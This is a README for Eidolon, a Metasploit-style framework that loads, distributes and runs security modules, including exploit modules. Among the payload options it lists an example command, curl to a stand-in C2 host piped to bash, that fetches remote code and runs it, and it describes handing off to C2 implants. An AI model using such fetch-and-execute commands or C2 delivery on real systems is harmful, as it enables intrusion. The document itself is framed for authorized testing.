<div align="center">

### **SPECTRAL CORE**
*Remote-Driven Module Arsenal · Modular · Spectral · Relentless*

[![Python](https://img.shields.io/badge/python-%E2%89%A53.8-cyan?style=flat-square)](https://python.org)
[![License](https://img.shields.io/badge/license-MPL--2.0-purple?style=flat-square)](LICENSE)
[![Version](https://img.shields.io/badge/version-3.2.1--GRIMOIRE-pink?style=flat-square)](pyproject.toml)
[![Deps](https://img.shields.io/badge/dependencies-1-blueviolet?style=flat-square)](pyproject.toml)

**English** · [فارسی](README.fa.md)

</div>

---

## 🌌 What is Eidolon?

**Eidolon** is a **modular, remote-driven framework** for managing and running security and
automation modules — a Metasploit-shaped workflow built around a radically small core:
everything beyond delivery, execution, and trust is a module, and every module is just
a Python file.

Instead of ten scattered scripts, one place holds it all:

- 🛰️ **Remote repositories** — pull modules from multiple remotes with priority resolution
- 📦 **One-command install** — `tar` / `tar.zst` / AES-encrypted packages / git clone
- 🧩 **Tiny module contract** — any `.py` with `OPTIONS` and `run(opts)` *is* a module
- 🖥️ **Interactive CLI** — tab completion, live prompts, true-color tables, session tracking
- 🔏 **TOFU trust model** — every installed module starts untrusted; integrity is explicit
- 🔐 **Encrypted distribution** — AES-256 packages for private module arsenals
- 💾 **Persistence** — globals and sessions survive restarts in SQLite
- 🎨 **Spectral UI** — true-color ANSI, gradient banner, Unicode chrome

---

## 🧭 Design Philosophy

Eidolon is built on four deliberate refusals:

1. **The framework never installs anything.** Module dependencies are *displayed*
   (`deps <name>` prints the exact `pip install` line); the operator runs it.
   A framework that shells out to pip on your behalf is a supply-chain hazard.
2. **Payloads are opaque.** An exploit module is a *delivery mechanism*. What gets
   delivered — shellcode path, executable, shell command, raw source, anything else —
   comes from the operator through four social-contract channels (below). The framework
   enforces nothing and judges nothing.
3. **C2 is always external.** Eidolon owns the exploit chain up to execution. Post-
   exploitation belongs to a dedicated C2 of your choice (Sliver, or a future companion
   framework). Hand-off is the module author's decision, expressed through the payload
   channels.
4. **Trust is earned, never assumed.** Downloads are verified by SHA-256 when the index
   provides it, and *cannot* proceed silently when it doesn't. First run of any module is
   recorded as untrusted (TOFU — Trust On First Use).

---

## ⚡ Installation

```bash
git clone https://github.com/null-flame/Eidolon.git
cd Eidolon
pip install .
eidolon
```

or from PyPI:

```bash
pip install eidolon-core
```

The only hard dependency is [`zstandard`](https://pypi.org/project/zstandard/).
`pyAesCrypt` is **optional** — needed only to pack or install encrypted packages
(the framework prints the exact command when it's missing; it never installs it).

---

## 🚀 Quick Start

```
$ eidolon

Eidolon ❯ repo sync
Eidolon ❯ repo search scanner
Eidolon ❯ repo install portscan
Eidolon ❯ use portscan
Eidolon (portscan) ❯ set target 10.0.0.7
Eidolon (portscan) ❯ run
```

Everyday commands:

| Command | Purpose |
|---|---|
| `modules` / `ls` | list loaded modules (`--all` for every type) |
| `search <kw>` | search local + all remote indexes |
| `info <name>` | metadata, options, requirements |
| `use <name>` / `back` | enter / leave a module context |
| `set <k> <v>` / `options` | configure and inspect options |
| `run` | execute the loaded module |
| `deps <name>` | show the module's pip requirements — never installs |
| `setg <k> <v>` / `globals` | workspace-wide persistent options |
| `sessions` / `status` | session tracking and workspace state |

---

## 🧩 The Module Contract

A module is any Python file exposing `OPTIONS` and `run(opts)`. That is the entire
mandatory contract:

```python
# hello_probe.py
NAME        = "hello-probe"            # optional metadata
VERSION     = "1.0.0"
DESCRIPTION = "Greets a host and reports latency."
CATEGORY    = "recon"
MODULE_TYPE = "auxiliary"              # exploit | auxiliary | generic
AUTHOR      = "you"
REQUIREMENTS = ["httpx"]               # shown by `deps`, never installed

OPTIONS = {
    "host": {
        "value": "",
        "required": True,
        "desc": "Target hostname or IP",
    },
    "port": {
        "value": 80,
        "required": False,
        "desc": "TCP port to probe",
    },
}

def run(opts):
    # opts is a flat dict of resolved values: {"host": "...", "port": 80}
    return f"{opts['host']}:{opts['port']} reachable"
```

- `OPTIONS` drives the CLI: `set`, `options`, tab completion, and required-value
  validation are all generated from it.
- `MODULE_TYPE` separates weapons (`exploit`) from tooling (`auxiliary`, `generic`).
- `REQUIREMENTS` is declarative only — `deps` prints `pip install httpx`; nothing
  is ever auto-installed.

### Writing modules locally

```
Eidolon ❯ new_module my_probe ~/code
```

scaffolds a fully documented skeleton (metadata, options, run, docstring guidance),
ready to fill in. Drop any file straight in with `add_module <src> [dest] [--force]`
or `install_local`.

### Payload channels (exploit modules)

Exploit modules decide *how* they deliver and treat the payload as an opaque blob
provided by the operator. Four conventional option names — a social contract, not an
enforced API:

| Channel | Meaning |
|---|---|
| `SHELLCODE_PATH` | path to shellcode on the operator's machine |
| `PAYLOAD_FILE` | path to any executable file |
| `CMD` | a shell command (`curl https://c2.example/payload \| bash`, …) |
| `PAYLOAD_SRC` | raw source / anything else the module author dreams up |

This keeps Eidolon agnostic about C2s: point `CMD` at Sliver's implant generator, at a
WebSocket listener, at whatever comes next — the module just delivers it.

### Multi-file modules

A module may be a directory. The entry file carries `OPTIONS` + `run(opts)`; helpers
and per-API logic live in sibling files imported relative to the module:

```
my_toolkit/
├── main.py          # OPTIONS, run(opts), imports _providers
├── _providers.py    # shared plumbing
└── providers/
    ├── alpha.py
    └── beta.py
```

```python
# main.py
from ._providers import dispatch          # relative import inside the module dir

def run(opts):
    return dispatch(opts["provider"], opts)
```

The loader imports the entry file as a module and leaves the rest of the directory
alone — no registration ceremony, no manifest. Archive only `.py` files you want
shipped (the packer skips `_*`, `@*`, dotfiles, and `__pycache__`).

---

## 🛰️ Repository System

### Remotes

Module indexes are plain JSON. The default remote is the official Eidolon arsenal;
add your own with priority — higher priority wins name collisions:

```
Eidolon ❯ repo add https://example.com/my-arsenal.json
Eidolon ❯ repo priority https://example.com/my-arsenal.json 20
Eidolon ❯ repo sync
Eidolon ❯ repo list-modules
```

### Index format

```json
{
  "name": "My Arsenal",
  "description": "Curated modules",
  "modules": [
    {
      "name": "portscan",
      "path": "network/portscan",
      "type": "tar",
      "version": "1.0.0",
      "url": "https://mirror.example/portscan.tar.zst",
      "sha256": "c6fa41440acd93f7a4647bca39122e039d9b1834c85225126d85df5ae0b34eed",
      "description": "Async TCP port scanner"
    }
  ]
}
```

- `type` — `tar` (`.tar` / `.tar.zst` / `.tar.zst.enc`) or `git`
- `path` — install location under `~/.eidolon/modules/` (traversal is rejected)
- `sha256` — strongly recommended; see the security model below
- `enc` / `password` / `key` — for encrypted packages, see below

### Install-time security model

- **SHA-256 verified when provided** — mismatch aborts the install, always.
- **Hashless packages are never silent** — the framework prints two loud SECURITY
  warnings and demands explicit consent: the operator must *type the module name* and
  then *type `yes`*. Anything else aborts with nothing written to disk.
  A hard block flag (`ENFORCE_SHA256` in `eidolon/repo.py`) ships `False` for the
  3.2.x series and will flip to `True` in a future release.
- **Anti-DoS limits** — indexes are capped at 5 MB, archives at 50 MB, enforced both
  via `Content-Length` and mid-stream.
- **Safe extraction** — archive members are screened for absolute paths, `..`
  traversal, and unsafe links before anything touches disk; installs go to a staging
  directory and are swapped atomically, with rollback on failure.
- **Git transports are HTTPS-only** — `ext::` and other non-HTTPS transports are
  refused, and `--` separates options from arguments.

---

## 🔐 Encrypted Packages (AES-256)

For private arsenals: pack a module into an encrypted package that a file host cannot
read, and that only holders of the password can install.

```
Eidolon ❯ repo pack ~/code/my_module my_module.tar.zst.enc
  package password: ********

  ▪ packed ~/code/my_module → my_module.tar.zst.enc
  • sha256 : 358687d4be89b838835ed1f2d123f887bda3d6dd5815f1f4eafc3a4345cf8a64
  • index entry fields:
      "url"      : "<host this file>"
      "sha256"   : "358687d4be89…"
      "enc"     : true
```

Format: `tar → zstd → pyAesCrypt.encryptStream` (AES-256-CBC + HMAC, 1 MB buffers).
Decryption is the exact inverse at install time.

Index wiring, two modes:

| Index entry | Behavior at install |
|---|---|
| `"enc": true` (no password) | operator is prompted via `getpass` — **real access control** for private modules |
| `"enc": true, "password": "…"` | decrypts silently — *obfuscation only*: anyone with the index can decrypt |

Wrong password, empty password, or a cancelled prompt aborts the install cleanly —
nothing is extracted.

---

## 🔏 Trust (TOFU)

Every `.py` file installed from a remote is registered **untrusted**. The first
execution is your moment of review — after inspecting the source (`repo source <name>`
prints it), promote it:

```
Eidolon ❯ repo source portscan
Eidolon ❯ trust portscan          # or: trust --all
Eidolon ❯ trusted [--all]
Eidolon ❯ verify                  # re-check digests of everything trusted
```

`untrust <module>` revokes; digests are cached so `verify` detects on-disk tampering
between runs.

---

## 🗂️ Workspace Layout

```
~/.eidolon/
├── modules/          # installed modules (path from the index)
├── cache/            # synced indexes and downloads
├── remotes.json      # remote registry (url / enabled / priority)
└── eidolon.db        # SQLite: globals, sessions, trust registry
```

---

## 🗺️ Roadmap

- Test suite + CI (the install/AES/trust flows are verified end-to-end manually; they
  are being landed as automated tests)
- `ENFORCE_SHA256 = True` — hard-block hashless archives in an upcoming release
- **Wraith** — planned companion framework: a minimal WebSocket listener and payload
  builder speaking a small, documented API for Eidolon hand-off

---

## ⚠️ Disclaimer

Eidolon is a tool for **authorized** security testing, research, and automation.
Running modules against systems you do not own or lack explicit permission to test is
illegal in most jurisdictions. The authors accept no liability for misuse.

---

## 📄 License

[MPL-2.0](LICENSE)
